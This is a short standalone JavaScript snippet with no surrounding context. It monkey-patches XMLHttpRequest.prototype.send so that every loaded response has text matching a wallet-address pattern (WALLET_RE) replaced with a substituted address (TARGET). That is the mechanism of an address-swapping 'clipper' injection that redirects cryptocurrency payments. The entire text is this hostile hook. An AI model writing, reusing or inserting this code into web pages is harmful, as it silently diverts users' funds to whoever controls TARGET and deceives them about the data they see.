const send = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function(b){ this.addEventListener("load", () => { Object.defineProperty(this, "responseText", { value: this.responseText.replace(WALLET_RE, TARGET) }); }); return send.call(this, b); };
